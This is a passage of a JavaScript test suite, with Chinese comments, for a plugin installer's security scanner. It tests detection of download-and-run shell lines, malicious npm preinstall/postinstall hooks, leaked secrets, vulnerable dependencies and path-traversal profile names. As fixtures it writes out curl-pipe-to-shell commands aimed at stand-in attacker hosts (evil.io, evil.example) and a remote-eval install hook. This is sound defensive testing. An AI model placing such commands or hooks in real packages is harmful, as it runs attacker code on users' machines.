  // 白名单边界锚定（自审 H1）：后缀攻击域（官方域.攻击者域）不是官方域——
  // 子串匹配会误降级 medium，弱提示真实攻击面
  const suffixAttack = await lib.scanScriptHazards(mkHaz("suffix.sh",
    "curl -s https://raw.githubusercontent.com.evil.io/x.sh | bash"));
  check("白名单后缀攻击域保持 critical", suffixAttack[0].severity, "critical");
  const prefixSuffix = await lib.scanScriptHazards(mkHaz("prefix-suffix.sh",
    "curl -s https://attacker-raw.githubusercontent.com.evil.io/x | sh"));
  check("白名单前缀+后缀攻击域保持 critical", prefixSuffix[0].severity, "critical");
  // 合法子域仍放行降级
  const subDomain = await lib.scanScriptHazards(mkHaz("sub.sh",
    "curl -sL https://mirror.raw.githubusercontent.com/user/setup.sh | bash"));
  check("白名单合法子域仍降级", [subDomain[0].category, subDomain[0].severity], ["downloadExec", "medium"]);
  // 官方域作为攻击者域的前缀（官方域.example.com）同样不降级——可信后缀才是判定锚
  const suffixOnly = await lib.scanScriptHazards(mkHaz("suffix-only.sh",
    "curl -sL https://raw.githubusercontent.com.example.com/setup.sh | bash"));
  check("官方域作前缀的攻击域保持 critical", suffixOnly[0].severity, "critical");

  // lifecycle 联合检测（package.json 恶意 JS 模式）
  const lcDir = join(process.env.DSH_HOME, "lifecycle-fixtures");
  mkdirSync(lcDir, { recursive: true });
  writeFileSync(join(lcDir, "package.json"), JSON.stringify({
    name: "evil-lifecycle", version: "1.0.0",
    scripts: { preinstall: "node setup.js" },
  }), "utf8");
  writeFileSync(join(lcDir, "setup.js"),
    "const cp = require('child_process');\ncp.exec('curl -s https://evil.example/x.sh | sh', { stdio: 'ignore' });\n",
    "utf8");
  const lcHits = await lib.scanLifecycleHazards(lcDir);
  check("lifecycle preinstall 指向文件命中 JS 恶意模式", lcHits.length > 0, true);
  check("lifecycle 命中含 script 字段", lcHits.every((h) => h.script === "preinstall"), true);
  // 远程 eval 形态（命令文本内联）
  writeFileSync(join(lcDir, "package.json"), JSON.stringify({
    name: "evil-lifecycle2", version: "1.0.0",
    scripts: { postinstall: "node -e \"https.get(u, r => r.on('data', d => eval(d)))\"" },
  }), "utf8");
  const lcHits2 = await lib.scanLifecycleHazards(lcDir);
  check("lifecycle 命令文本内联远程 eval 命中", lcHits2.some((h) => h.id === "remote-eval"), true);
  // 干净 lifecycle 无命中
  writeFileSync(join(lcDir, "package.json"), JSON.stringify({
    name: "clean-lifecycle", version: "1.0.0",
    scripts: { postinstall: "node scripts/build.js" },
  }), "utf8");
  mkdirSync(join(lcDir, "scripts"), { recursive: true });
  writeFileSync(join(lcDir, "scripts", "build.js"), "console.log('build ok');\n", "utf8");
  check("lifecycle 干净脚本无命中", (await lib.scanLifecycleHazards(lcDir)).length, 0);

  // 安装前 secrets 扫描（scanCacheSecrets：目录遍历 + 扩展名过滤 + 上限）
  const secDir = join(process.env.DSH_HOME, "secrets-fixtures");
  // token fixture 拼接构造：避免源码出现完整密钥字面量（平台 secret scanning push protection）
  const secP = (...p) => ["sk-", ...p].join("");
  mkdirSync(join(secDir, "lib"), { recursive: true });
  mkdirSync(join(secDir, "node_modules", "dep"), { recursive: true });
  writeFileSync(join(secDir, "config.js"), `module.exports = { apiKey: "${secP("AbCd1234EfGh5678IjKl90Mn")}" };\n`, "utf8");
  writeFileSync(join(secDir, "lib", "settings.json"), JSON.stringify({ password: "Tr0ub4dor&3XYZ" }), "utf8");
  // node_modules 内的命中必须被跳过（依赖目录不算插件源码泄露）
  writeFileSync(join(secDir, "node_modules", "dep", "index.js"), `const k = "${secP("ZxYw9876VuTs5432RqPo12Mn")}";\n`, "utf8");
  const secHits = await lib.scanCacheSecrets(secDir);
  check("secrets 已知密钥结构命中", secHits.some((h) => h.kind === "secret-key" && h.file === "config.js" && h.line === 1), true);
  check("secrets 关键词邻近命中", secHits.some((h) => h.kind === "context" && h.file === "lib/settings.json"), true);
  check("secrets 跳过 node_modules", secHits.every((h) => !h.file.includes("node_modules")), true);
  check("secrets 相对路径正斜杠", secHits.every((h) => !h.file.includes("\\")), true);
  // .env 文件（无扩展名形态）也要扫到
  writeFileSync(join(secDir, ".env.local"), "API_KEY=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n", "utf8");
  const secHits2 = await lib.scanCacheSecrets(secDir);
  check("secrets .env 基名文件命中", secHits2.some((h) => h.file === ".env.local" && h.kind === "github"), true);
  // 干净仓库无命中
  const secClean = join(secDir, "clean");
  mkdirSync(secClean, { recursive: true });
  writeFileSync(join(secClean, "index.js"), "console.log('hello world');\n", "utf8");
  check("secrets 干净仓库无命中", (await lib.scanCacheSecrets(secClean)).length, 0);
  // 不存在的目录返回空
  check("secrets 目录缺失返回空", (await lib.scanCacheSecrets(join(secDir, "nope"))).length, 0);

  // 安装前依赖 CVE 扫描（readVulnScanDeps 纯函数 + scanCacheVulnerabilities mock API）
  const vulnPkg = {
    name: "vuln-fixture", version: "1.0.0",
    dependencies: { lodash: "^4.17.15", express: "4.18.2" },
    optionalDependencies: { fsevents: "^2.3.2" },
    devDependencies: { "dev-only-pkg": "^1.0.0" },
  };
  const vulnDeps = lib.readVulnScanDeps(vulnPkg, new Map([["lodash", "4.17.15"]]));
  check("cve deps 含 dependencies+optional", vulnDeps.map((d) => d.name).sort(), ["express", "fsevents", "lodash"]);
  check("cve lockfile 精确版本优先", vulnDeps.find((d) => d.name === "lodash").version, "4.17.15");
  check("cve 无锁文件剥 ^ 取下界", vulnDeps.find((d) => d.name === "fsevents").version, "2.3.2");
  check("cve devDependencies 不进扫描面", vulnDeps.some((d) => d.name === "dev-only-pkg"), false);
  // npm: 别名依赖：漏洞面在真实包上——解出真实名+版本进扫描面
  const aliasDeps = lib.readVulnScanDeps({
    dependencies: { "my-lodash": "npm:lodash@4.17.15", "@x/alias": "npm:@scope/pkg@2.0.0", local: "file:./p", ws: "workspace:*", lnk: "link:../q" }
  }, new Map());
  check("cve npm: 别名解出真实包", aliasDeps.find((d) => d.name === "lodash")?.version, "4.17.15");
  check("cve npm: scoped 别名同款解析", aliasDeps.some((d) => d.name === "@scope/pkg" && d.version === "2.0.0"), true);
  check("cve 本地协议（file/workspace/link）跳过", aliasDeps.every((d) => !["local", "ws", "lnk"].includes(d.name)), true);
  // 边界：npm: 无版本段（git 分支引用形态）不误收
  const gitAlias = lib.readVulnScanDeps({ dependencies: { g: "npm:pkg@main" } }, new Map());
  check("cve npm: 非语义版本段按原样保留", gitAlias[0]?.version, "main");
  const cveDir = join(process.env.DSH_HOME, "cve-fixtures");
  mkdirSync(cveDir, { recursive: true });
  writeFileSync(join(cveDir, "package.json"), JSON.stringify(vulnPkg), "utf8");
  // mock：lodash@4.17.15 命中 critical/high，express/fsevents 干净
  const origVulnFetch = globalThis.fetch;
  globalThis.fetch = async (url, opts) => {
    if (!String(url).includes("/security/advisories/bulk")) return { ok: false, status: 404 };
    const req = JSON.parse(String(opts.body));
    const payload = {};
    if (req.lodash?.[0] === "4.17.15") {
      payload.lodash = [{
        severity: "critical", title: "Prototype Pollution in lodash",
        vulnerable_versions: ">=4.0.0 <4.17.21", url: "https://github.com/advisories/GHSA-test"
      }];
    }
    return {
      ok: true, status: 200,
      json: async () => payload,
      text: async () => JSON.stringify(payload),
      arrayBuffer: async () => Buffer.from(JSON.stringify(payload)),
    };
  };
  try {
    const vulnHits = await lib.scanCacheVulnerabilities(cveDir);
    check("cve bulk API critical/high 命中", vulnHits.length, 1);
    check("cve 命中字段完整", [vulnHits[0].name, vulnHits[0].severity, vulnHits[0].title.includes("Prototype Pollution")],
      ["lodash", "critical", true]);
    // moderate/low 不弹（只收 critical/high）
    globalThis.fetch = async (url, opts) => {
      if (!String(url).includes("/security/advisories/bulk")) return { ok: false, status: 404 };
      const req = JSON.parse(String(opts.body));
      const payload = req.lodash ? { lodash: [{ severity: "moderate", title: "ReDoS", vulnerable_versions: "<4.17.21", url: "" }] } : {};
      return {
        ok: true, status: 200,
        json: async () => payload,
        text: async () => JSON.stringify(payload),
        arrayBuffer: async () => Buffer.from(JSON.stringify(payload)),
      };
    };
    const vulnModerate = await lib.scanCacheVulnerabilities(cveDir);
    check("cve moderate/low 不命中弹窗面", vulnModerate.length, 0);
    // 网络失败静默降级（不阻断安装）
    globalThis.fetch = async () => { throw new Error("network down"); };
    check("cve 网络失败静默降级", (await lib.scanCacheVulnerabilities(cveDir)).length, 0);
    // API 非 200 同样降级
    globalThis.fetch = async () => ({ ok: false, status: 503 });
    check("cve API 非 200 静默降级", (await lib.scanCacheVulnerabilities(cveDir)).length, 0);
  } finally {
    globalThis.fetch = origVulnFetch;
  }
  // package.json 缺失返回空
  check("cve package.json 缺失返回空", (await lib.scanCacheVulnerabilities(join(secDir, "clean"))).length, 0);
  // file: 协议依赖从目标分包 package.json 取版本
  const cveFileDir = join(process.env.DSH_HOME, "cve-file-fixture");
  mkdirSync(join(cveFileDir, "packages", "local-a"), { recursive: true });
  writeFileSync(join(cveFileDir, "package.json"), JSON.stringify({
    name: "vuln-file", version: "1.0.0",
    dependencies: { "local-a": "file:packages/local-a" },
  }), "utf8");
  writeFileSync(join(cveFileDir, "packages", "local-a", "package.json"),
    JSON.stringify({ name: "local-a", version: "2.0.3" }), "utf8");
  globalThis.fetch = async (url, opts) => {
    if (!String(url).includes("/security/advisories/bulk")) return { ok: false, status: 404 };
    const req = JSON.parse(String(opts.body));
    const payload = req["local-a"]?.[0] === "2.0.3" ? { "local-a": [{ severity: "high", title: "XSS", vulnerable_versions: "<2.1.0", url: "" }] } : {};
    return {
      ok: true, status: 200,
      json: async () => payload,
      text: async () => JSON.stringify(payload),
      arrayBuffer: async () => Buffer.from(JSON.stringify(payload)),
    };
  };
  try {
    const fileHits = await lib.scanCacheVulnerabilities(cveFileDir);
    check("cve file: 协议依赖读子包版本命中", fileHits.length, 1);
    check("cve file: 命中版本正确", [fileHits[0].name, fileHits[0].version], ["local-a", "2.0.3"]);
  } finally {
    globalThis.fetch = origVulnFetch;
  }

  // 9. CLI 指令 npm 等价回退纯函数（issue #54 archify 教训）
  check("isNpmCliTarget scope 包带版本", lib.isNpmCliTarget("@tt-a1i/archify-dsh@0.1.0"), true);
  // 跨 profile 锚点定位（自审 H5）：resolveRecordNodeModules 按记录 location 定位真实落点
  {
    const profilesRoot = join(process.env.DSH_HOME, "profiles");
    const webNm = join(profilesRoot, "web", "node_modules");
    const legacyNm = join(profilesRoot, "legacy", "node_modules");
    mkdirSync(join(legacyNm, "old-plugin"), { recursive: true });
    lib.setTargetProfile("desktop");
    try {
      // location 在其他 profile 内 → 返回那个 profile 的 node_modules
      check("锚点：legacy profile 记录定位到 legacy NM",
        lib.resolveRecordNodeModules({ location: join(legacyNm, "old-plugin") }), legacyNm);
      // 无 location → 回退当前 PROFILE_NM
      check("锚点：无 location 回退当前 NM",
        lib.resolveRecordNodesModules === undefined ? lib.resolveRecordNodeModules({}) : lib.resolveRecordNodeModules({}),
        join(profilesRoot, "desktop", "node_modules"));
      // location 在当前 profile 内 → 当前 NM
      check("锚点：当前 profile 记录返回当前 NM",
        lib.resolveRecordNodeModules({ location: join(join(profilesRoot, "desktop", "node_modules"), "p") }),
        join(profilesRoot, "desktop", "node_modules"));
      // 非法 profile 名（穿越形态）不解析——回退当前 NM
      check("锚点：非法 profile 名回退",
        lib.resolveRecordNodeModules({ location: join(profilesRoot, "..", "evil", "node_modules", "x") }),
        join(profilesRoot, "desktop", "node_modules"));
      // 七轮审计：CLI 记录（无 location）用安装时刻保存的 profile 提示定位
      check("锚点：CLI 记录 profile 提示定位到提示的 profile",
        lib.resolveRecordNodeModules({ location: null, profile: "legacy" }), legacyNm);
      // 提示非法（穿越形态）→ 回退当前 PROFILE_NM
      check("锚点：CLI 记录非法提示回退当前 NM",
        lib.resolveRecordNodeModules({ location: null, profile: "../evil" }),
        join(profilesRoot, "desktop", "node_modules"));
      // 无提示且无 location → 回退当前 PROFILE_NM
      check("锚点：CLI 记录无提示回退当前 NM",
        lib.resolveRecordNodeModules({ profile: null }),
        join(profilesRoot, "desktop", "node_modules"));
    } finally {
      lib.setTargetProfile("web");
    }
  }
  check("isNpmCliTarget 裸包名", lib.isNpmCliTarget("dsh-web-ui-all"), true);
  check("isNpmCliTarget owner/name 仓库形态", lib.isNpmCliTarget("tt-a1i/archify"), false);
  check("isNpmCliTarget 空/非法", lib.isNpmCliTarget(""), false);
  check("npmTargetName scope 包剥版本", lib.npmTargetName("@tt-a1i/archify-dsh@0.1.0"), "@tt-a1i/archify-dsh");
  check("npmTargetName 裸包剥版本", lib.npmTargetName("dsh-web-ui-all@1.2.3"), "dsh-web-ui-all");
  check("npmTargetName 无版本原样", lib.npmTargetName("@a/b"), "@a/b");

  // ---- findPluginRoots（覆盖矩阵审计：50 个导出中唯一零测试引用）----
  // 皮肤/多包仓库的插件根识别：只收 looksLikeDshPlugin===true 的清单目录，
  // 普通 npm 子包/点目录/node_modules 不被误收；插件根内不再深入子目录。
  const prRoot = mkFixture("pluginroots", {
    "README.md": "# multi",
    "skins/dark/package.json": DSH_PLUGIN_PKG,
    "skins/light/package.json": DSH_PLUGIN_PKG,
    "utils/plain/package.json": JSON.stringify({ name: "plain-helper" }),
    "skins/dark/nested/package.json": DSH_PLUGIN_PKG, // 插件根内嵌套：不深入
    ".hidden/package.json": DSH_PLUGIN_PKG,
    "node_modules/vendor/package.json": DSH_PLUGIN_PKG
  });
  const prRoots = await lib.findPluginRoots(prRoot);
  check("findPluginRoots 多包仓库只收插件根", prRoots.length, 2);
  check("findPluginRoots 含 skins/dark", prRoots.some((r) => r.endsWith("skins" + sep + "dark")), true);
  check("findPluginRoots 含 skins/light", prRoots.some((r) => r.endsWith("skins" + sep + "light")), true);
  check("findPluginRoots 不收普通 npm 子包", prRoots.some((r) => r.endsWith("utils" + sep + "plain")), false);
  check("findPluginRoots 不收插件根内嵌套", prRoots.some((r) => r.endsWith("nested")), false);
  check("findPluginRoots 不收点目录", prRoots.some((r) => r.includes(".hidden")), false);
  check("findPluginRoots 不收 node_modules", prRoots.some((r) => r.includes("node_modules")), false);
  // 单插件根：根目录本身是插件 → 返回根且不深入
  const prSingle = mkFixture("pluginroots-single", {
    "package.json": DSH_PLUGIN_PKG,
    "lib/index.js": "export default {};",
    "lib/extra/package.json": DSH_PLUGIN_PKG
  });
  const prSingleRoots = await lib.findPluginRoots(prSingle);
  check("findPluginRoots 单插件根返回根", prSingleRoots.length, 1);
  check("findPluginRoots 单插件根为根目录", prSingleRoots[0] === prSingle, true);

  console.log(`\n${pass} passed, ${fail} failed`);
  process.exit(fail === 0 ? 0 : 1);
})();